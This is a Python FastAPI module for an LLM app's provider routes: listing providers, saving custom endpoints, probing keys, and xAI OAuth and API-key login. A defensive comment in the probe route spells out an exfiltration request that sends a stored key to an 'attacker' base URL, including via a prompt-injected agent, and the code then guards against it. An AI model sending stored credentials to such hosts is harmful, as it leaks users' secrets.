"""Provider auth routes (xAI OAuth device-code + API key)."""
from __future__ import annotations

import asyncio
import contextlib
import logging
from typing import Any

from fastapi import FastAPI, HTTPException
from pydantic import BaseModel, Field

# Any used by connected-providers payload typing
from remedy.interfaces.api_support import (
    _apply_llm_to_runtime,
    _default_config_path,
    _find_config_path,
    _write_config,
    load_config,
)
from remedy.interfaces.config import (
    detect_ollama,
    normalize_llm_settings,
    public_provider_catalog,
)

logger = logging.getLogger(__name__)


class XaiApiKeyRequest(BaseModel):
    api_key: str = Field(..., min_length=1)


class CustomProviderRequest(BaseModel):
    """Save the Custom endpoint form as a provider of its own."""

    name: str = Field(..., min_length=1, max_length=80)
    base_url: str = Field(..., min_length=1)
    api_key: str | None = None
    #: openai | anthropic | ollama | gemini; omitted → detected by probing.
    flavour: str | None = None
    #: False when the host takes no key (local server, open proxy).
    requires_key: bool | None = None
    #: Replace an existing saved endpoint instead of creating another.
    id: str | None = None


class ProviderProbeRequest(BaseModel):
    provider: str = Field(..., min_length=1)
    api_key: str | None = None
    base_url: str | None = None


def _home_from_config(cfg: dict[str, Any] | None = None):
    from pathlib import Path

    cfg = cfg if cfg is not None else load_config()
    home = cfg.get("home_dir")
    return Path(home).expanduser() if home else None


def _hot_reload_xai(runtime, cfg: dict[str, Any] | None = None) -> None:
    """Push xAI credentials into the live runtime when provider is xai."""
    if runtime is None:
        return
    cfg = cfg if cfg is not None else load_config()
    provider = str(cfg.get("llm_provider") or "").lower()
    if provider != "xai":
        return
    try:
        from remedy.interfaces.xai_auth import resolve_bearer

        token = resolve_bearer(_home_from_config(cfg))
    except Exception as exc:
        logger.debug("xAI hot-reload resolve failed: %s", exc)
        return
    if not token:
        return
    provider, model, base_url = normalize_llm_settings(
        cfg.get("llm_provider") or "xai",
        cfg.get("llm_model"),
        cfg.get("llm_base_url"),
    )
    _apply_llm_to_runtime(
        runtime,
        provider=provider,
        model=model,
        base_url=base_url,
        api_key=token,
    )


def register_auth_routes(app: FastAPI, *, runtime=None, gateway=None, memory=None) -> None:
    """Register provider auth endpoints."""

    @app.get("/api/providers")
    async def list_providers():
        """Known providers with base URL, models, and auth modes."""
        cfg = load_config()
        return {"providers": public_provider_catalog(cfg)}

    @app.post("/api/providers/custom")
    async def save_custom_provider(req: CustomProviderRequest):
        """Custom endpoint → named provider (``custom-<slug>``).

        The template row stays blank; the saved entry shows up in every
        picker like a built-in. Keys go to the secure store under the new
        id; config.toml keeps only name/url/flavour.
        """
        from remedy.interfaces.model_discovery import discover_models
        from remedy.interfaces.secret_store import set_provider_secret
        from remedy.interfaces.user_providers import (
            USER_PROVIDER_PREFIX,
            upsert_spec,
        )

        name = str(req.name or "").strip()
        base = str(req.base_url or "").strip().rstrip("/")
        key = str(req.api_key or "").strip()
        if not name:
            raise HTTPException(status_code=400, detail="name required")
        if not base or "://" not in base:
            raise HTTPException(status_code=400, detail="base_url must be a full URL")
        pid = str(req.id or "").strip().lower() or None
        if pid and not pid.startswith(USER_PROVIDER_PREFIX):
            raise HTTPException(status_code=400, detail="not a saved custom endpoint")

        flavour = (req.flavour or "").strip().lower() or None
        probe_note: str | None = None
        disc = await discover_models(base, key, provider_hint="custom", timeout=6.0)
        if disc.ok:
            detected = {"lmstudio": "openai", "llamacpp": "openai"}.get(
                disc.flavour or "", disc.flavour or "openai"
            )
            flavour = flavour or detected
        else:
            probe_note = disc.error
        flavour = flavour or "openai"
        cfg = load_config()
        requires_key = req.requires_key
        if requires_key is None:
            if key:
                requires_key = True
            elif pid:
                # Editing without retyping the key keeps the stored requirement.
                from remedy.interfaces.user_providers import specs_from_config

                prev = specs_from_config(cfg).get(pid) or {}
                requires_key = prev.get("auth", "api_key") == "api_key"
            else:
                requires_key = False

        try:
            cfg, pid = upsert_spec(
                cfg,
                name=name,
                base_url=base,
                flavour=flavour,
                auth="api_key" if requires_key else "none",
                pid=pid,
            )
        except ValueError as exc:
            raise HTTPException(status_code=400, detail=str(exc)) from exc
        if key:
            # Direct store write: no owner inference — a key pasted for *this*
            # endpoint belongs to this endpoint, whatever it looks like.
            set_provider_secret(pid, key, home=_home_from_config(cfg))
        _write_config(_find_config_path() or _default_config_path(), cfg)

        entry = next(
            (p for p in public_provider_catalog(cfg) if p["id"] == pid), None
        )
        return {
            "ok": True,
            "id": pid,
            "provider": entry,
            "discovery": disc.as_dict(),
            "models": [
                {"id": m["id"], "name": m.get("name") or m["id"]}
                for m in disc.models
                if m.get("chat", True)
            ],
            "note": probe_note,
        }

    @app.delete("/api/providers/custom/{pid}")
    async def delete_custom_provider(pid: str):
        from remedy.interfaces.secret_store import clear_provider_secret
        from remedy.interfaces.user_providers import is_user_provider, remove_spec

        pid = str(pid or "").strip().lower()
        if not is_user_provider(pid):
            raise HTTPException(status_code=404, detail="no such saved endpoint")
        cfg = load_config()
        cfg = remove_spec(cfg, pid)
        with contextlib.suppress(Exception):
            clear_provider_secret(pid, home=_home_from_config(cfg))
        _write_config(_find_config_path() or _default_config_path(), cfg)
        return {"ok": True, "id": pid}

    @app.get("/api/providers/connected")
    async def list_connected_providers():
        """Providers ready for the main-screen picker (connected + enabled).

        Connected = has credentials / OAuth / local detect / demo.
        Enabled = listed in config enabled_providers (default: all connected).
        """
        from remedy.interfaces.config import (
            PROVIDER_CATALOG,
            classify_provider_connection,
            detect_ollama,
            effective_provider_allowlist,
            get_provider_keys,
            public_provider_catalog,
        )
        from remedy.interfaces.secret_store import public_secret_status

        cfg = load_config()
        catalog = {p["id"]: p for p in public_provider_catalog(cfg)}
        keys = get_provider_keys(cfg)
        try:
            keys_set = public_secret_status(_home_from_config(cfg)).get(
                "provider_keys_set"
            ) or {}
        except Exception:
            keys_set = dict.fromkeys(keys, True)

        enabled_raw = cfg.get("enabled_providers")
        enabled_models_cfg = cfg.get("enabled_models") or {}
        if not isinstance(enabled_models_cfg, dict):
            enabled_models_cfg = {}
        last_by = cfg.get("last_model_by_provider") or {}
        if not isinstance(last_by, dict):
            last_by = {}

        ollama = detect_ollama()
        xai_connected = False
        try:
            from remedy.interfaces.xai_auth import load_credentials

            xai_connected = bool(load_credentials(_home_from_config(cfg)).connected)
        except Exception:
            pass

        classified: list[tuple[str, dict[str, Any], bool, str]] = []
        for pid, meta in catalog.items():
            connected, reason = classify_provider_connection(
                pid,
                cfg=cfg,
                keys=keys,
                keys_set=keys_set,
                ollama_available=bool(ollama.get("available")),
                xai_connected=xai_connected,
            )
            classified.append((pid, meta, connected, reason))

        enabled_set = effective_provider_allowlist(
            enabled_raw,
            catalog_ids=set(catalog),
            connected_ids={pid for pid, _m, conn, _r in classified if conn},
        )

        items: list[dict[str, Any]] = []
        for pid, meta, connected, reason in classified:
            enabled = True if enabled_set is None else (pid in enabled_set)
            # Guest demo must always be switchable when connected (zero-setup path).
            if pid == "demo" and connected:
                enabled = True
            models = list(meta.get("models") or [])
            allow = enabled_models_cfg.get(pid)
            # Demo: always full curated catalog (enabled_models must not hide Gemini Flash Lite).
            # enabled_models is a soft preference list for the *connected catalog
            # preview only* — never shrink to a single stale id when the allowlist
            # is a leftover subset (e.g. deepseek-chat after V4 rename). If the
            # filter would leave 0–1 models while the catalog has more, ignore it
            # so the status bar can show live/catalog intelligence.
            if pid != "demo" and isinstance(allow, list) and allow:
                allow_set = {str(x) for x in allow}
                filtered = [m for m in models if str(m.get("id")) in allow_set]
                if len(filtered) >= 2 or len(models) <= 1:
                    models = filtered
                # else: keep full catalog; live /api/models is still authoritative

            # Ollama: what is actually pulled on this machine (not a curated guess).
            if pid == "ollama" and ollama.get("available"):
                names = [str(n) for n in (ollama.get("models") or []) if n]
                if names:
                    models = [
                        {"id": n, "name": n, "provider": "ollama", "source": "endpoint"}
                        for n in names
                    ]
            # RMB: inject discovered GGUFs so status-bar model picker can load them
            if pid == "rmb":
                try:
                    from pathlib import Path as _Path

                    from remedy.runtime.rmb.config import load_rmb_json, merge_state
                    from remedy.runtime.rmb.service import discover_ggufs

                    home = cfg.get("home_dir") if isinstance(cfg, dict) else None
                    discovered = discover_ggufs(home)
                    rstate = merge_state(load_rmb_json(home))
                    seen_ids: set[str] = set()
                    disc_models: list[dict[str, Any]] = []
                    for g in discovered:
                        if not isinstance(g, dict):
                            continue
                        path = str(g.get("path") or "").strip()
                        name = str(g.get("name") or (_Path(path).name if path else ""))
                        mid = str(g.get("id") or _Path(name).stem or name).strip()
                        if not mid or mid in seen_ids:
                            continue
                        seen_ids.add(mid)
                        sz = g.get("size_gb")
                        label = name if name else mid
                        if sz is not None:
                            label = f"{label} ({sz} GB)"
                        disc_models.append({"id": mid, "name": label})
                    # Currently loaded weights first
                    mp = str(rstate.get("model_path") or "").strip()
                    if mp:
                        stem = _Path(mp).stem
                        if stem and stem not in seen_ids:
                            disc_models.insert(
                                0,
                                {
                                    "id": stem,
                                    "name": f"{_Path(mp).name} (loaded)",
                                },
                            )
                            seen_ids.add(stem)
                        elif stem:
                            # Move loaded to front
                            disc_models = [
                                m for m in disc_models if str(m.get("id")) == stem
                            ] + [
                                m for m in disc_models if str(m.get("id")) != stem
                            ]
                    if disc_models:
                        # Discovered first, then catalog ids not already present
                        catalog_rest = [
                            m
                            for m in models
                            if str(m.get("id") or "") not in seen_ids
                            and str(m.get("id") or "") != "default"
                        ]
                        models = disc_models + catalog_rest
                    # Mark connected when a runtime path, loaded GGUF, or
                    # discovered file exists. Do not call get_rmb_status here
                    # (that path is too heavy for the models list).
                    if not connected and (
                        bool(str(rstate.get("runtime_binary") or "").strip())
                        or bool(mp)
                        or bool(disc_models)
                    ):
                        connected = True
                        reason = "rmb_local"
                except Exception:
                    pass

            last_model = last_by.get(pid) or meta.get("default_model")
            # Never keep a demo-only id as last_model for a non-demo provider
            if pid != "demo" and last_model:
                low = str(last_model).lower()
                if any(
                    x in low
                    for x in (
                        "gemini-3.1-flash-lite",
                        "codestral-latest",
                        "gpt-oss:20b",
                        "kimi-k3",
                    )
                ) or "(demo)" in low or low.endswith(" demo"):
                    last_model = (
                        models[0].get("id") if models else meta.get("default_model")
                    )
            if models and last_model and not any(
                str(m.get("id")) == str(last_model) for m in models
            ):
                last_model = models[0].get("id")
            items.append(
                {
                    **meta,
                    "connected": connected,
                    "connect_reason": reason,
                    "enabled": enabled,
                    "picker_eligible": bool(connected and enabled),
                    "models": models,
                    "last_model": last_model,
                    "catalog_models": list(
                        (PROVIDER_CATALOG.get(pid) or {}).get("models") or []
                    ),
                }
            )

        active = str(cfg.get("llm_provider") or "").lower()
        return {
            "providers": items,
            "connected": [p for p in items if p["connected"]],
            "picker": [p for p in items if p["picker_eligible"]],
            "active_provider": active,
            "active_model": cfg.get("llm_model"),
            "enabled_providers": (
                sorted(enabled_set) if enabled_set is not None else None
            ),
        }

    @app.get("/api/providers/free")
    async def list_free_providers():
        """Curated free / local / demo options for Setup and Settings."""
        from remedy.interfaces.provider_catalog import free_options_public

        return {"options": free_options_public()}

    @app.get("/api/providers/ollama/detect")
    async def ollama_detect():
        """Probe local Ollama for first-run / setup suggestions."""
        return detect_ollama()

    @app.post("/api/providers/probe")
    async def probe_provider(req: ProviderProbeRequest):
        """Check that a provider answers /models. Does not persist the key."""
        import time as _time

        from remedy.interfaces.config import (
            PROVIDER_CATALOG,
            infer_key_owner,
            resolve_provider_api_key,
        )
        from remedy.interfaces.model_discovery import (
            discover_models,
            ollama_base_url_from_env,
        )

        pid = str(req.provider or "").strip().lower()
        if not pid:
            raise HTTPException(status_code=400, detail="provider required")
        cfg = load_config()
        key = str(req.api_key or "").strip()
        # Whether the key was pasted by the caller (they own it) vs pulled from
        # the encrypted store (a secret the API must never send to an arbitrary
        # host). base_url is caller-controlled — remember that too.
        key_from_request = bool(key)
        base_from_request = bool(str(req.base_url or "").strip())
        if not key:
            with contextlib.suppress(Exception):
                key = str(resolve_provider_api_key(cfg, pid) or "").strip()
        owner = infer_key_owner(key)
        if owner:
            pid = owner
        meta = PROVIDER_CATALOG.get(pid) or {}
        base = str(req.base_url or "").strip()
        # Don't keep an xAI URL when the pasted key is Anthropic (etc.).
        if owner and base and pid != str(req.provider or "").strip().lower():
            base = ""
        if not base:
            if pid == str(cfg.get("llm_provider") or "").strip().lower():
                base = str(cfg.get("llm_base_url") or "").strip()
            if not base:
                base = str(meta.get("base_url") or "").strip()

        # SECURITY: never send a STORED key to a caller-supplied base_url that
        # is not the provider's own endpoint. Without this, a loopback caller
        # (or a prompt-injected agent) could POST {provider:"openai",
        # base_url:"http://attacker/v1"} with no key and exfiltrate the stored
        # OpenAI key as a Bearer token. A pasted key (key_from_request) is the
        # caller's own to send anywhere; a stored key is not.
        if key and not key_from_request and base_from_request:
            from urllib.parse import urlparse

            def _host(u: str) -> str:
                with contextlib.suppress(Exception):
                    return (urlparse(u).hostname or "").lower()
                return ""

            allowed_hosts = {
                _host(str(meta.get("base_url") or "")),
                _host(str(cfg.get("llm_base_url") or "")),
            }
            allowed_hosts.discard("")
            if _host(base) not in allowed_hosts:
                return {
                    "ok": False,
                    "provider": pid,
                    "base_url": base,
                    "status": None,
                    "latency_ms": None,
                    "models": 0,
                    "model_list": [],
                    "error": (
                        "Refused: won't send the stored API key to a custom URL "
                        "that isn't this provider's own endpoint. Paste the key "
                        "explicitly to test an arbitrary endpoint."
                    ),
                }

        if pid == "anthropic" and key:
            from remedy.interfaces.anthropic_auth import is_subscription_oauth_token

            if is_subscription_oauth_token(key):
                return {
                    "ok": False,
                    "provider": pid,
                    "base_url": base,
                    "status": None,
                    "latency_ms": None,
                    "models": 0,
                    "model_list": [],
                    "error": (
                        "That is a Claude Code / Max login token, not a Console API key. "
                        "Anthropic does not allow those tokens in Remedy. "
                        "Use a Console key (sk-ant-api…) with API credits, "
                        "or switch provider."
                    ),
                }
        def _result(
            *,
            ok: bool,
            status: int | None = None,
            latency_ms: float | None = None,
            models: list[dict[str, Any]] | None = None,
            error: str | None = None,
            base_url: str = "",
            flavour: str | None = None,
        ) -> dict[str, Any]:
            rows = [
                {"id": str(m.get("id")), "name": str(m.get("name") or m.get("id"))}
                for m in (models or [])
                if m.get("id")
            ]
            return {
                "ok": ok,
                "provider": pid,
                "base_url": base_url or base,
                "status": status,
                "latency_ms": latency_ms,
                "models": len(rows),
                "model_list": rows,
                "flavour": flavour,
                "error": error,
            }

        if not base:
            return _result(ok=False, error="No base URL for this provider.")
        keyless = "none" in (meta.get("auth") or []) or pid in (
            "rmb", "llamacpp", "custom", "ollama", "demo"
        )
        if not keyless and (not key or key in ("local", "unused")):
            return _result(
                ok=False, error="No API key stored. Paste a key and Test, then Save."
            )
        if pid == "ollama" and not base_from_request:
            base = ollama_base_url_from_env() or base

        t0 = _time.perf_counter()
        disc = await discover_models(base, key, provider_hint=pid, timeout=6.0)
        ms = round((_time.perf_counter() - t0) * 1000.0, 1)
        if disc.ok:
            rows = [m for m in disc.models if m.get("chat", True)]
            if pid == "demo":
                # Curated guest allowlist, validated against the gateway.
                allowed = {str(m.get("id")) for m in (meta.get("models") or [])}
                rows = [m for m in rows if m.get("id") in allowed] or [
                    {"id": m["id"], "name": m.get("name")} for m in (meta.get("models") or [])
                ]
            return _result(
                ok=True,
                status=disc.status or 200,
                latency_ms=ms,
                models=rows,
                base_url=base,
                flavour=disc.flavour,
            )
        err = disc.error or "Provider did not answer."
        if pid == "ollama" and disc.status is None:
            err = "Ollama is not running on this machine."
        elif disc.status is None and "timed out" in err:
            err = "Timed out reaching the provider. Check the URL / network."
        elif disc.status is None:
            err = f"Could not reach provider: {err}"
        elif disc.status in (401, 403):
            err = f"Provider rejected the key (HTTP {disc.status}): {err}"
        else:
            err = f"Provider returned HTTP {disc.status}: {err}"
        return _result(
            ok=False,
            status=disc.status,
            latency_ms=ms if disc.status is not None else None,
            base_url=base,
            flavour=disc.flavour,
            error=err,
        )

    @app.get("/api/auth/xai")
    async def xai_auth_status():
        from remedy.interfaces.xai_auth import load_credentials

        home = _home_from_config()
        creds = load_credentials(home)
        return creds.to_public_dict(home=home)

    @app.get("/api/auth/xai/oauth-meta")
    async def xai_oauth_meta():
        """Diagnostics: which OAuth host this server build uses."""
        from remedy.interfaces import xai_auth

        return {
            "oauth_build": getattr(xai_auth, "OAUTH_BUILD_ID", "unknown"),
            "device_code_url": getattr(xai_auth, "DEVICE_CODE_URL", ""),
            "token_url": getattr(xai_auth, "TOKEN_URL", ""),
            "accounts_server": getattr(xai_auth, "ACCOUNTS_SERVER", ""),
        }

    @app.post("/api/auth/xai/login")
    async def xai_auth_login():
        """Start OAuth device-code flow (Sign in with xAI)."""
        from remedy.interfaces.xai_auth import start_device_login

        try:
            # Network round-trip to xAI — off the loop so a slow accounts
            # server cannot stall every other request (chat stream, hello).
            result = await asyncio.to_thread(start_device_login, home=_home_from_config())
        except Exception as exc:
            logger.warning("xAI device login failed: %s", exc)
            raise HTTPException(status_code=502, detail=f"xAI OAuth start failed: {exc}") from exc
        return result

    @app.get("/api/auth/xai/login/status")
    async def xai_auth_login_status(session_id: str | None = None):
        from remedy.interfaces.xai_auth import login_status

        status = login_status(session_id=session_id, home=_home_from_config())
        # Once connected, ensure config + runtime use xAI if user is mid-setup.
        sess = (status.get("session") or {})
        if sess.get("status") == "connected":
            # GET must not steal the chat provider. Only refresh xAI slots
            # when the owner is already on xAI (Settings PUT still switches).
            cfg = load_config()
            prev = str(cfg.get("llm_provider") or "").strip().lower()
            if prev == "xai":
                _hot_reload_xai(runtime, cfg)
        return status

    @app.post("/api/auth/xai/apikey")
    async def xai_auth_apikey(req: XaiApiKeyRequest):
        """Store an xAI console API key (secondary to OAuth)."""
        from remedy.interfaces.xai_auth import save_api_key

        try:
            creds = save_api_key(req.api_key, home=_home_from_config())
        except ValueError as exc:
            raise HTTPException(status_code=400, detail=str(exc)) from exc

        cfg = load_config()
        config_path = _find_config_path() or _default_config_path()
        config_path.parent.mkdir(parents=True, exist_ok=True)
        provider, model, base_url = normalize_llm_settings(
            cfg.get("llm_provider") or "xai",
            cfg.get("llm_model"),
            cfg.get("llm_base_url") or "https://api.x.ai/v1",
        )
        # If user is on xAI (or has no provider), keep key in config too for CLI parity.
        if provider == "xai" or not cfg.get("llm_provider"):
            provider, model, base_url = normalize_llm_settings("xai", model, base_url)
            cfg["llm_provider"] = provider
            cfg["llm_model"] = model
            cfg["llm_base_url"] = base_url
            cfg["llm_api_key"] = req.api_key.strip()
            _write_config(config_path, cfg)
            _apply_llm_to_runtime(
                runtime,
                provider=provider,
                model=model,
                base_url=base_url,
                api_key=req.api_key.strip(),
            )
        return {
            "status": "saved",
            **creds.to_public_dict(home=_home_from_config()),
        }

    @app.delete("/api/auth/xai")
    async def xai_auth_logout():
        """Clear stored xAI OAuth tokens and API key."""
        from remedy.interfaces.xai_auth import clear_credentials

        clear_credentials(home=_home_from_config())
        cfg = load_config()
        if str(cfg.get("llm_provider") or "").lower() == "xai" and cfg.get("llm_api_key"):
            config_path = _find_config_path() or _default_config_path()
            if config_path.exists():
                cfg.pop("llm_api_key", None)
                _write_config(config_path, cfg)
        if runtime is not None and str(getattr(runtime, "_llm_provider", "")).lower() == "xai":
            with contextlib.suppress(Exception):
                runtime._llm_api_key = ""
        return {"status": "logged_out", "provider": "xai", "connected": False}
